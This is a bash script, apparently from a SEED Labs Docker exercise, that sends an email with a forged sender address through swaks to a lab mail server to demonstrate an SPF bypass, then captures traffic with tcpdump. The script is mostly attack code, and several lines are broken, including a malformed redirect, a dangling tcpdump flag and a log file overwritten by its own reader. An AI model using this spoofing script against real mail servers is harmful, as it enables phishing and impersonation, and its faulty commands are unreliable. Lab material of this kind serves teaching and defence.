#!/usr/bin/bash

# This script is meant to be run from the interactive shell inside the attacker container in the  SEED Labs Docker network setup

# This particular attack is meant to show what an SPF bypass attack looks like

# From attacker container (10.9.0.7)
# Send email from victim's domain using swaks

# Color codes for output
# RED='\033[0;31m'
# GREEN='\033[0;32m'
# YELLOW='\033[1;33m'
# NC='\033[0m' # No Color

# IP addresses from the containers
ATTACKER_IP="10.9.0.7"
MAIL_SERVER_IP="10.9.0.6" # aka VICTIM
VICTIM_DOMAIN="10.9.0.5"  # DNS

# These are cvariables with the output file names
EMAIL_FILE="spf-spoof-attack.log"
NETWORK_FILE="spf-network-traffic.log"
#LOG_FILE="spf-log.log"
#DOMAIN_FILE="spf-dns.log"

# check if the number of args is correct
if [ $# -ne 3 ]; then
    echo "Usage: $0 <sender-email> <destination-email> <message>"
    exit 1
fi

sender=$1
target=$2
message=$3

send_email() {
    swaks --from $sender --to $target \
  --server $MAIL_SERVER_IP --port 25 \
  --header "From: ${sender}" \
  --header "To: ${target}" \
  --helo attacker.attacker.test \
  --header "Subject: SPF Test" \
  --body $message \
  --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
}

monitor_network() {
  tcpdump -i eth0 -w "$NETWORK_FILE" -c 1 -w 2>/dev/null &
  sleep 0.5
  tcpdump -r "$NETWORK_FILE" 2>/dev/null | tee "$NETWORK_FILE"
}

print_logs() {
  sleep 5
  echo ""
  echo ""
  echo "Email Headers"
  cat -n "$EMAIL_FILE" | grep -i -A3 -B1 'MAIL FROM| RCPT'
}
# Function Calls
send_email
monitor_network
print_logs
